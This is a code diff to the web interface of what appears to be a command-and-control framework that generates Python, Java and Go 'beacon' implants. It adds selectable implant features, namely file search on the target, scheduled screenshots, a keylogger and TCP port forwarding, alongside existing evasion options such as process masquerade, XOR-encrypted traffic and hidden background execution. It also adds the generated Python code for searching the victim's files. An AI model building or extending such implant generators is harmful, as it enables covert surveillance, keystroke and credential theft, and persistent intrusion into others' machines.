@@ -174,6 +174,11 @@ const LANG = {
     ev_masq:'Process masquerade', ev_masq_desc:'Changes process name (Linux)',
     ev_encrypt:'Payload encryption', ev_encrypt_desc:'Encrypts each request body with XOR+nonce',
     ev_background:'Background execution', ev_background_desc:'Linux: double-fork daemon · Windows: no console window',
+    gen_features:'Features',
+    feat_find:'File search', feat_find_desc:'find [path] <pattern> — search files on target',
+    feat_screenshot_sched:'Screenshot schedule', feat_screenshot_sched_desc:'screenshot <N> — auto-capture every N min (0 to stop)',
+    feat_keylogger:'Keylogger', feat_keylogger_desc:'keylog start|stop|dump — capture keystrokes in background',
+    feat_portfwd:'Port forwarding', feat_portfwd_desc:'portfwd <lport> <rhost>:<rport> — static TCP tunnel',
     gen_btn:'⚡ Generate Beacon', save_as:'Save as',
     info_title:'Info', info_type_py:'Python 3 beacon', info_type_java:'Java 11 beacon',
     info_out_py:'.py / Linux ELF', info_cross_yes:'Yes — Windows/Linux/macOS',
@@ -265,6 +270,11 @@ const LANG = {
     ev_masq:'Process masquerade', ev_masq_desc:'Cambia el nombre del proceso (Linux)',
     ev_encrypt:'Payload encryption', ev_encrypt_desc:'Cifra el body de cada request con XOR+nonce',
     ev_background:'Background execution', ev_background_desc:'Linux: doble-fork daemon · Windows: sin ventana de consola',
+    gen_features:'Features',
+    feat_find:'Búsqueda de archivos', feat_find_desc:'find [ruta] <patrón> — busca archivos en el target',
+    feat_screenshot_sched:'Screenshot automático', feat_screenshot_sched_desc:'screenshot <N> — captura cada N minutos (0 para detener)',
+    feat_keylogger:'Keylogger', feat_keylogger_desc:'keylog start|stop|dump — captura teclas en background',
+    feat_portfwd:'Port forwarding', feat_portfwd_desc:'portfwd <lport> <rhost>:<rport> — túnel TCP estático',
     gen_btn:'⚡ Generar Beacon', save_as:'Guardar como',
     info_title:'Info', info_type_py:'Python 3 beacon', info_type_java:'Java 11 beacon',
     info_out_py:'.py / Linux ELF', info_cross_yes:'Sí — Windows/Linux/macOS',
@@ -2323,6 +2333,28 @@ function renderGenerateView() {
         </div>
       </div>
 
+      <div class="info-card" style="margin:0 0 16px 0">
+        <h3>${t('gen_features')}</h3>
+        <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px 24px;margin-top:4px">
+          <label style="display:flex;align-items:flex-start;gap:8px;cursor:pointer;font-size:12px;color:var(--text2)">
+            <input type="checkbox" id="feat-find" checked style="margin-top:2px;accent-color:var(--accent)">
+            <div><div style="color:var(--text)">${t('feat_find')}</div><div style="color:var(--text3);font-size:11px">${t('feat_find_desc')}</div></div>
+          </label>
+          <label style="display:flex;align-items:flex-start;gap:8px;cursor:pointer;font-size:12px;color:var(--text2)">
+            <input type="checkbox" id="feat-screenshot-sched" style="margin-top:2px;accent-color:var(--accent)">
+            <div><div style="color:var(--text)">${t('feat_screenshot_sched')}</div><div style="color:var(--text3);font-size:11px">${t('feat_screenshot_sched_desc')}</div></div>
+          </label>
+          <label style="display:flex;align-items:flex-start;gap:8px;cursor:pointer;font-size:12px;color:var(--text2)">
+            <input type="checkbox" id="feat-keylogger" style="margin-top:2px;accent-color:var(--accent)">
+            <div><div style="color:var(--text)">${t('feat_keylogger')}</div><div style="color:var(--text3);font-size:11px">${t('feat_keylogger_desc')}</div></div>
+          </label>
+          <label style="display:flex;align-items:flex-start;gap:8px;cursor:pointer;font-size:12px;color:var(--text2)">
+            <input type="checkbox" id="feat-portfwd" style="margin-top:2px;accent-color:var(--accent)">
+            <div><div style="color:var(--text)">${t('feat_portfwd')}</div><div style="color:var(--text3);font-size:11px">${t('feat_portfwd_desc')}</div></div>
+          </label>
+        </div>
+      </div>
+
       <button class="btn" onclick="generateBeacon()" style="width:100%;justify-content:center;padding:12px">
         ${t('gen_btn')}
       </button>
@@ -3024,6 +3056,12 @@ async function generateBeacon() {
     encrypt:    document.getElementById('ev-encrypt').checked,
     background: document.getElementById('ev-background').checked,
   };
+  const features = {
+    find:           document.getElementById('feat-find').checked,
+    screenshotSched: document.getElementById('feat-screenshot-sched').checked,
+    keylogger:      document.getElementById('feat-keylogger').checked,
+    portfwd:        document.getElementById('feat-portfwd').checked,
+  };
 
   const res = await apiFetch('/api/info/agent-secret');
   if (!res || !res.ok) { alert('Failed to get agent secret'); return; }
@@ -3049,15 +3087,15 @@ async function generateBeacon() {
   document.getElementById('beacon-dl-buttons-java').style.display = 'none';
   document.getElementById('beacon-dl-buttons-go').style.display   = 'none';
   if (_beaconLang === 'java') {
-    code = generateJavaBeaconCode(urls, sleep, jitter, info.agent_secret, persist, ev, killDate, encMode, bid, serverKey, hbDays);
+    code = generateJavaBeaconCode(urls, sleep, jitter, info.agent_secret, persist, ev, killDate, encMode, bid, serverKey, hbDays, features);
     filename = 'Beacon.java';
     document.getElementById('beacon-dl-buttons-java').style.display = 'flex';
   } else if (_beaconLang === 'go') {
-    code = generateGoBeaconCode(urls, sleep, jitter, info.agent_secret, persist, ev, killDate, encMode, bid, serverKey, hbDays);
+    code = generateGoBeaconCode(urls, sleep, jitter, info.agent_secret, persist, ev, killDate, encMode, bid, serverKey, hbDays, features);
     filename = 'main.go';
     document.getElementById('beacon-dl-buttons-go').style.display = 'flex';
   } else {
-    code = generateBeaconCode(urls, sleep, jitter, info.agent_secret, persist, ev, killDate, encMode, bid, serverKey, hbDays);
+    code = generateBeaconCode(urls, sleep, jitter, info.agent_secret, persist, ev, killDate, encMode, bid, serverKey, hbDays, features);
     filename = 'beacon.py';
     document.getElementById('beacon-dl-buttons-py').style.display   = 'flex';
   }
@@ -3127,7 +3165,7 @@ function _sEnc(str, seed) {
   return Array.from(out).map(b=>b.toString(16).padStart(2,'0')).join('');
 }
 
-function generateBeaconCode(urls, sleep, jitter, secret, persist = false, ev = {}, killDate = null, encMode = 'xor', bid = null, serverKey = null, hbDays = 0) {
+function generateBeaconCode(urls, sleep, jitter, secret, persist = false, ev = {}, killDate = null, encMode = 'xor', bid = null, serverKey = null, hbDays = 0, features = {}) {
   if (!Array.isArray(urls)) urls = [urls];
   function xorEnc(str, key) {
     const enc = new TextEncoder();
@@ -3144,6 +3182,27 @@ function generateBeaconCode(urls, sleep, jitter, secret, persist = false, ev = {
   const es    = encMode !== 'server' ? enc(secret) : '';
   // xPy: encrypts a string at generation time → emits _d("hex", _k) in Python source
   const xPy = s => `_d("${enc(s)}", _k)`;
+
+  // ── Feature code blocks ───────────────────────────────────────────────────
+  const findBlock = features.find ? `
+    if cmd.startswith('find '):
+        import fnmatch as _fnm
+        _fargs = cmd[5:].strip().split(None, 1)
+        if not _fargs: return 'Usage: find [path] <pattern>'
+        _fpat = _fargs[-1]; _fpath = _fargs[0] if len(_fargs) == 2 else _cwd
+        if not os.path.isabs(_fpath): _fpath = os.path.join(_cwd, _fpath)
+        _res = []
+        try:
+            for _root, _dirs, _files in os.walk(_fpath):
+                for _fn in _files:
+                    if _fnm.fnmatch(_fn.lower(), _fpat.lower()):
+                        _fp = os.path.join(_root, _fn)
+                        try: _res.append(f'{_fp}  ({os.path.getsize(_fp)} B)')
+                        except: _res.append(_fp)
+                if len(_res) >= 500: _res.append('... (truncated at 500 results)'); break
+        except Exception as _fe: return f'Error: {_fe}'
+        return '\\n'.join(_res) or 'No files found.'
+` : '';
 
   // ── Evasion code blocks ───────────────────────────────────────────────────
   const uaBlock = ev.traffic ? `
@@ -3641,7 +3700,7 @@ def run_command(cmd, task_id=None):
             return _jmod.dumps({"path": os.path.abspath(ls_path), "entries": entries})
         except Exception as _le:
             return f"Error: {_le}"
-
+${findBlock}
     if cmd.startswith("shell "): cmd = cmd[6:]
 
     # Windows: handle 'cd' natively in Python to avoid cmd.exe trailing-backslash
@@ -3789,7 +3848,7 @@ if __name__ == "__main__":
 `;
 }
 
-function generateJavaBeaconCode(urls, sleep, jitter, secret, persist = false, ev = {}, killDate = null, encMode = 'xor', bid = null, serverKey = null, hbDays = 0) {
+function generateJavaBeaconCode(urls, sleep, jitter, secret, persist = false, ev = {}, killDate = null, encMode = 'xor', bid = null, serverKey = null, hbDays = 0, features = {}) {
   if (!Array.isArray(urls)) urls = [urls];
   function xorEnc(str, key) {
     const enc = new TextEncoder();
@@ -4359,7 +4418,7 @@ public class Beacon {
 `;
 }
 
-function generateGoBeaconCode(urls, sleep, jitter, secret, persist = false, ev = {}, killDate = null, encMode = 'xor', bid = null, serverKey = null, hbDays = 0) {
+function generateGoBeaconCode(urls, sleep, jitter, secret, persist = false, ev = {}, killDate = null, encMode = 'xor', bid = null, serverKey = null, hbDays = 0, features = {}) {
   if (!Array.isArray(urls)) urls = [urls];
 
   function xorEnc(str, key) {
